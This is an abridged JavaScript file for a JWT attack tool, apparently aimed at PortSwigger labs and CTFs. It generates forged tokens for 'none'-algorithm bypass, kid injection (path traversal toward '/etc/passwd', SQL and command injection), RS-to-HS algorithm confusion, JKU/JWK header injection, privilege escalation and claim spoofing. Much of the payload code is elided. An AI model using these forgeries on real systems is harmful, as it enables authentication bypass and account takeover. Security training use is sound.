...
window.jwtAttackPlatform = {
    ...
    setupEvents: function() {
        document.addEventListener('click', (e) => {
            // Only process clicks within the attacks tab or on attack cards
    ...
    showUnavailableMessage: function(attackType) {
        ...
        notification.innerHTML = `
            <h3 style="color: var(--primary-color); margin-bottom: 15px;">🔒 Attack Coming Soon</h3>
    ...
    generateNoneBypassConfig: function() {
        return `
            <div class="config-section">
                <h4>🚫 None Algorithm Bypass Attack</h4>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">📝 Paste the JWT token you want to modify</small>
                </div>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">🔧 Check this to add or modify claims in the payload</small>
                </div>
                ...
                <div class="config-group" id="custom-claims-container-none" style="display: none;">
                    ...
                    <small class="field-hint">🎯 Add custom claims in JSON format. These will be merged with existing payload.</small>
                </div>
    ...
    generateKidInjectionConfig: function() {
        return `
            <div class="config-section">
                <h4>💉 Kid Parameter Injection Attack</h4>
                <p class="attack-description">
                ...
                <div class="config-group checkbox-group">
                    ...
                    <small class="field-hint">🔧 Enable payload modification for privilege escalation</small>
                </div>
                ...
                <div class="config-group" id="custom-claims-group-kid">
                    ...
                    <small class="field-hint">⚡ Add custom claims to test privilege escalation</small>
                </div>

                <div class="config-group">
                    <label for="target-file-kid">Target File Path (Optional)</label>
                    <input type="text" id="target-file-kid" placeholder="/etc/passwd">
                    <small class="field-hint">🎯 Specify a custom target file for path traversal attacks</small>
                </div>

                <div class="attack-info">
                    <h5>🔍 Attack Vectors Generated:</h5>
                    <ul>
            ...
            noneVariations.forEach(variation => {
                ...
                [header, headerWithoutTyp].forEach((headerVariant, index) => {
                    ...
                    this.generatedPayloads.push({
                        title: `🚫 None Algorithm (${variation.description}, ${headerType}) - No Signature`,
                    ...
                    this.generatedPayloads.push({
                        title: `🚫 None Algorithm (${variation.description}, ${headerType}) - Missing Signature`,
        ...
        try {
            ...
            for (const payload of pathTraversalPayloads) {
                ...
                try {
                    ...
                    this.generatedPayloads.push({
                        title: `📁 Path Traversal - ${payload.desc}`,
                        payload: signedToken,
                    ...
                    if (basePayload.sub && basePayload.sub !== 'administrator') {
                        ...
                        this.generatedPayloads.push({
                            title: `🔐 Admin Escalation via ${payload.desc}`,
                            payload: adminToken,
            ...
            for (const payload of sqlPayloads) {
                ...
                try {
                    ...
                    this.generatedPayloads.push({
                        title: `🗄️ SQL Injection - ${payload.desc}`,
                        payload: signedToken,
            ...
            for (const payload of commandPayloads) {
                ...
                try {
                    ...
                    this.generatedPayloads.push({
                        title: `⚡ Command Injection - ${payload.desc}`,
                        payload: signedToken,
            ...
            if (targetFile && targetFile !== '/dev/null') {
                ...
                try {
                    ...
                    this.generatedPayloads.push({
                        title: `🎯 Custom Target - ${targetFile}`,
                        payload: customToken,
    ...
    showResults: function() {
        ...
        let html = `
            <div class="results-summary">
                <h4>🎯 Generated ${this.generatedPayloads.length} Attack Payloads</h4>
        ...
        return `
            <div class="config-section">
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">📝 Token should use asymmetric algorithm (RS*/ES*/PS*)</small>
                </div>
...
-----END PUBLIC KEY-----" rows="6"></textarea>
                    <small class="field-hint">🔑 Public key to use as HMAC secret</small>
                </div>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">📋 JWKS will be converted to PEM format automatically</small>
                </div>
                ...
                <div class="attack-info">
                    <h5>🔍 Comprehensive Algorithm Confusion Coverage:</h5>
                    <ul>
                        <li><strong>🎯 PortSwigger Labs:</strong> x.509 PEM with newline (proven working)</li>
                        <li><strong>🏆 CTF Challenges:</strong> PKCS1 format, DER bytes, minimal RSA</li>
                        <li><strong>📋 Legacy Systems:</strong> Various PEM formats and encodings</li>
                        <li><strong>🔧 Edge Cases:</strong> Empty secrets, null keys, double encoding</li>
                        <li><strong>🛡️ Multi-Algorithm:</strong> RS256/384/512 → HS256/384/512</li>
                    </ul>
                    <p class="field-hint">
                        <strong>🚀 Total Coverage:</strong> 14 different attack variations covering PortSwigger Labs,
    ...
    async generateAlgoConfusionPayloads() {
        ...
        try {
            ...
            const algorithmMappings = [
                ...
                { from: 'RS256', to: 'HS256', desc: '🎯 x.509 PEM with newline (PortSwigger Labs)', payload: adminPayload, secret: pemKey },

                // CTF Common Variations
                { from: 'RS256', to: 'HS256', desc: '🏆 PKCS1 PEM format (CTF Common)', payload: adminPayload, secret: 'PKCS1_PEM' },
                { from: 'RS256', to: 'HS256', desc: '📜 x.509 PEM without newline (Legacy)', payload: adminPayload, secret: pemKey.replace(/\n$/, '') },
                { from: 'RS256', to: 'HS256', desc: '🔢 Raw DER bytes (Binary Format)', payload: adminPayload, secret: 'DER_BYTES' },
                { from: 'RS256', to: 'HS256', desc: '📋 Base64 content only (No Headers)', payload: adminPayload, secret: pemKey.replace(/-----BEGIN PUBLIC KEY-----/g, '').replace(/-----END PUBLIC KEY-----/g, '').replace(/\r?\n|\r/g, '') },

                // Advanced CTF Edge Cases
                { from: 'RS256', to: 'HS256', desc: '🔧 PKCS1 DER bytes (ASN.1 Raw)', payload: adminPayload, secret: 'PKCS1_DER' },
                { from: 'RS256', to: 'HS256', desc: '📐 Minimal RSA (n,e only)', payload: adminPayload, secret: 'MINIMAL_RSA' },
                { from: 'RS256', to: 'HS256', desc: '🔤 Base64 PEM (Double Encoded)', payload: adminPayload, secret: 'BASE64_PEM' },
                { from: 'RS256', to: 'HS256', desc: '📏 64-char wrapped PEM (Standard)', payload: adminPayload, secret: 'WRAPPED_PEM' },

                // Alternative Algorithms
                { from: 'RS384', to: 'HS384', desc: '🔐 RSA-384 to HMAC-384', payload: adminPayload, secret: pemKey },
                { from: 'RS512', to: 'HS512', desc: '🛡️ RSA-512 to HMAC-512', payload: adminPayload, secret: pemKey },

                // Edge Cases for Vulnerable Implementations
                { from: 'RS256', to: 'HS256', desc: '❌ Empty secret (Null Key)', payload: adminPayload, secret: 'EMPTY' },
                { from: 'RS256', to: 'HS256', desc: '🚫 Zero key (Single Null Byte)', payload: adminPayload, secret: 'ZERO' },
                { from: 'RS256', to: 'HS256', desc: '📝 String "null" (Literal)', payload: adminPayload, secret: 'NULL_STRING' }
            ];
            ...
            for (const mapping of algorithmMappings) {
                ...
                try {
                    ...
                    this.generatedPayloads.push({
                        title: `🔄 ${mapping.desc}`,
                        payload: signedToken,
                        description: `Algorithm confusion: ${mapping.from} → ${mapping.to}`,
    ...
    generateJkuManipulationConfig: function() {
        return `
            <div class="config-section">
                <h4>🌐 JKU/X5U Manipulation Attack</h4>
                <p class="attack-description">
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">🌐 URL where you'll host the malicious JWK Set (e.g., PortSwigger exploit server)</small>
                </div>
                ...
                <div class="config-group checkbox-group">
                    ...
                    <small class="field-hint">🔑 Generate fresh RSA keys for this attack</small>
                </div>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">⚡ Claims to inject (e.g., change user to administrator)</small>
                </div>
                ...
                <div class="config-group checkbox-group">
                    ...
                    <small class="field-hint">🎯 Generate additional SSRF testing payloads</small>
                </div>

                <div class="attack-info">
                    <h5>🔍 PortSwigger Lab Attack Flow:</h5>
                    <ol>
        ...
        try {
            ...
            if (rsaKeyPair) {
                try {
                    ...
                    this.generatedPayloads.push({
                        title: '🎯 JKU Header Injection (PortSwigger Lab)',
                        payload: signedToken,
    ...
    generateJwkInjectionConfig: function() {
        return `
            <div class="config-section">
                <h4>🔑 JWK Header Injection Attack</h4>
                <p class="attack-description">
...
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----" rows="6"></textarea>
                    <small class="field-hint">🔑 Your RSA public key in PEM format</small>
                </div>
                ...
                <div class="attack-info">
                    <h5>🔍 JWK Injection Techniques:</h5>
                    <ul>
    ...
    generatePrivilegeEscalationConfig: function() {
        return `
            <div class="config-section">
                <h4>⬆️ Privilege Escalation Attack</h4>
                <p class="attack-description">
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">📝 Paste the JWT token you want to escalate</small>
                </div>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">⚡ Additional claims to inject</small>
                </div>

                <div class="attack-info">
                    <h5>🔍 Privilege Escalation Techniques:</h5>
                    <ul>
        ...
        try {
            ...
            if (escalateRole) {
                ...
                roleVariations.forEach(variant => {
                    ...
                    this.generatedPayloads.push({
                        title: `⬆️ Role Escalation - ${variant.desc}`,
            ...
            if (escalateAdmin) {
                ...
                adminVariations.forEach(variant => {
                    ...
                    this.generatedPayloads.push({
                        title: `🔐 Admin Escalation - ${variant.desc}`,
                        payload: adminToken,
            ...
            if (escalateUser) {
                ...
                userTargets.forEach(user => {
                    ...
                    ['sub', 'user_id', 'username', 'email', 'user'].forEach(claimName => {
                        ...
                        this.generatedPayloads.push({
                            title: `👤 User Impersonation - ${claimName}: ${user}`,
            ...
            if (escalateTime) {
                ...
                timeVariations.forEach(variant => {
                    ...
                    this.generatedPayloads.push({
                        title: `⏰ Time Manipulation - ${variant.desc}`,
                        payload: timeToken,
        ...
        return `
            <div class="config-section">
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">🏢 Trusted issuer to impersonate</small>
                </div>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">🎯 Target audience for the token</small>
                </div>
                ...
                <div class="config-group">
                    ...
                    <small class="field-hint">🎭 Custom claims to spoof</small>
                </div>

                <div class="attack-info">
                    <h5>🔍 Claim Spoofing Techniques:</h5>
                    <ul>
        ...
        try {
            ...
            if (spoofIdentity) {
                ...
                identityVariations.forEach(variant => {
                    ...
                    this.generatedPayloads.push({
                        title: `🎭 Identity Spoofing - ${variant.desc}`,
            ...
            if (spoofAudience) {
                ...
                audienceVariations.forEach(audience => {
                    ...
                    this.generatedPayloads.push({
                        title: `🎯 Audience Spoofing - ${Array.isArray(audience) ? audience.join(',') : audience}`,
            ...
            if (spoofSession) {
                ...
                sessionVariations.forEach(variant => {
                    ...
                    this.generatedPayloads.push({
                        title: `📱 Session Spoofing - ${variant.desc}`,
            ...
            if (spoofAuth) {
                ...
                authVariations.forEach(variant => {
                    ...
                    this.generatedPayloads.push({
                        title: `🔐 Auth Spoofing - ${variant.desc}`,
                        payload: authToken,
    ...
    showPemConversion: function(pemKey) {
        ...
        notification.innerHTML = `
            <div style="display: flex; justify-content: between; align-items: center; margin-bottom: 10px;">
                <span style="color: var(--success-color); font-weight: bold;">✅ JWKS Converted to PEM</span>
                <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: var(--text-color); cursor: pointer; padding: 0; margin-left: 10px;">✕</button>
            </div>
